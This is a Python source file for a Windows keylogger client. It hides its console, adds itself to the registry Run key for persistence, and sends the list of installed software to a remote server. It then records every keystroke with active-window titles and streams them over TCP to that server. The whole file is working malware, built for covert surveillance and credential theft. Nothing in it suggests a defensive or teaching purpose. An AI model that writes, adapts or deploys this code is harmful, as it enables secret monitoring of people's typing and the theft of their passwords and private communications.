import socket
import threading
import time
import win32gui
import winreg
import ctypes
import os
from pynput import keyboard
import sys
import logging

# Suppress any output by disabling logging to avoid traces
logging.basicConfig(level=logging.CRITICAL)

# Client configuration
SERVER_HOST = '192.168.100.53'  # Replace with the server's IP address
SERVER_PORT = 5001
current_window = None  # Global variable to track the active window

# Helper function to run the client silently in the background
def hide_console():
    """Hide the console window to avoid interaction."""
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Register the client to run on system startup
def set_autostart():
    """Add the client to the registry so it runs on startup."""
    try:
        # The path to the executable (for PyInstaller or if packaged as EXE)
        exe_path = sys.executable
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        reg_value = "ClientApp"

        # Open the registry and create a new entry
        with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, reg_value, 0, winreg.REG_SZ, exe_path)

        print("Autostart set successfully.")
    except Exception as e:
        print(f"Failed to set autostart: {e}")

# Function to fetch the active window title
def get_active_window_title():
    """Fetch the title of the currently active window."""
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown"

# Function to fetch installed software information
def fetch_installed_software():
    """Fetch installed applications and their versions from the registry."""
    software_list = []
    reg_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ]
    for reg_path in reg_paths:
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
            for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
                try:
                    sub_key_name = winreg.EnumKey(reg_key, i)
                    sub_key = winreg.OpenKey(reg_key, sub_key_name)
                    name = winreg.QueryValueEx(sub_key, "DisplayName")[0]
                    version = winreg.QueryValueEx(sub_key, "DisplayVersion")[0] if winreg.QueryValueEx(sub_key, "DisplayVersion") else "Unknown"
                    license_info = "Unknown"  # Placeholder for license information
                    software_list.append(f"{name} (Version: {version}, License: {license_info})")
                except EnvironmentError:
                    continue
        except Exception as e:
            pass
    return software_list

# Function to send the software information to the server
def send_software_info():
    """Send the list of installed software to the server as plain text."""
    software_list = fetch_installed_software()
    client_socket.sendall("\n[SOFTWARE INFO]\n".encode('utf-8'))
    for software in software_list:
        client_socket.sendall(f"{software}\n".encode('utf-8'))
    client_socket.sendall("\n[END SOFTWARE INFO]\n".encode('utf-8'))

# Function to send keystrokes to the server
def send_keylogs_to_server():
    """Capture keystrokes, window title changes, and send them to the server."""
    global current_window

    log_buffer = []

    def on_press(key):
        """Capture keypress and send to the server."""
        global current_window

        try:
            # Get the current active window
            active_window = get_active_window_title()

            # Check if the window has changed
            if active_window != current_window:
                current_window = active_window
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                header = f"\n[{timestamp}] Active Window: {active_window}\n"
                log_buffer.append(header)

            # Handle printable characters
            if hasattr(key, 'char') and key.char:
                log_buffer.append(key.char)
            # Handle special keys
            else:
                if key == keyboard.Key.space:
                    log_buffer.append(' ')
                elif key == keyboard.Key.enter:
                    log_buffer.append('\n')
                elif key == keyboard.Key.backspace:
                    if log_buffer:
                        log_buffer.pop()  # Remove the last character
                elif key == keyboard.Key.delete:
                    pass  # Delete does nothing in this scenario
                else:
                    log_buffer.append(f'[{key.name}]')

            # Send the updated buffer to the server
            client_socket.sendall("".join(log_buffer).encode('utf-8'))
            log_buffer.clear()  # Clear buffer after sending
        except Exception as e:
            print(f"Error: {e}")

    # Start keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Connect to the server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_HOST, SERVER_PORT))
print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")

# Hide the console window
hide_console()

# Set autostart to ensure the client runs at startup
set_autostart()

# Send software info to the server
send_software_info()

# Start sending keylogs to the server
try:
    keylog_thread = threading.Thread(target=send_keylogs_to_server)
    keylog_thread.start()
except KeyboardInterrupt:
    print("Keylogger stopped.")
    client_socket.close()
